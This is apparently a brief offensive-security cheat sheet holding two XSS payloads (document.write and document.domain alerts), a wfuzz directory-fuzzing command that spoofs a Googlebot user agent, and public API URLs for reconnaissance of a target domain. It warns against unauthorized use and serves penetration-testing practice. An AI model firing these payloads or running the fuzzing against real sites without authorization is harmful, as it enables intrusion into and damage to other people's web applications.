<br>
<h1 align="center"> Offensive Security MISC Anotations and Payloads</h1> <br>

<br>
<br>


# xss
- Personally created XSS payloads <br>

<br>

## Danger zone! <br>
> Danger zone is the area which xss payloads can be OR will be harmfull to a web application <br>
> so, do no use them unless you're sure the web app will not be damaged! <br>

<br>

> Do not use these payloads in a random or unauthorized web site, I do not take any resposibility <br>
> to any person who decide to execute those on random places, you have been warned!

## document.write <br>

```html
;//<!----><SCRIPT>alert(1);</SCRIPT><svg onerror="alert(document.write(1337))">
```
<br>

## document.domain <br>

```html
;//<!----><SCRIPT>alert(1);</SCRIPT><svg onload="alert(document.domain)">
```

<br>

<hr>

<br>

# wFuzz
- wFuzz is a web application fuzzing tool <br>

<br>

##  Ultimate wFuzz command v1 <br>

```sh
sudo wfuzz --hc 404,400,302,301 -u https://site.com/FUZZ -w WORDLIST.txt -H "User-Agent: Googlebot-News" -t 50
```

<br>

<hr>

<br>

# APIs
- Apis for any kinds of target reconnaissance.
- Switch the URL with your target domain/ip.

<br>

## DNS Look up <br>

> https://api.hackertarget.com/dnslookup/?q=URL

<br>

## HTTP Headers <br>

> https://api.hackertarget.com/httpheaders/?q=URL

<br>

## Host Search <br>

> https://api.hackertarget.com/hostsearch/?q=URL

<br>

## Crawlers <br>
- Alien Vault limit parameter can be set to any integer number,
- as well as the page parameter.
- Common Crawl outputs with json format.

> https://otx.alienvault.com/api/v1/indicators/hostname/URL/url_list?limit=50&page=1
> https://index.commoncrawl.org/CC-MAIN-2021-43-index?url=URL&output=json
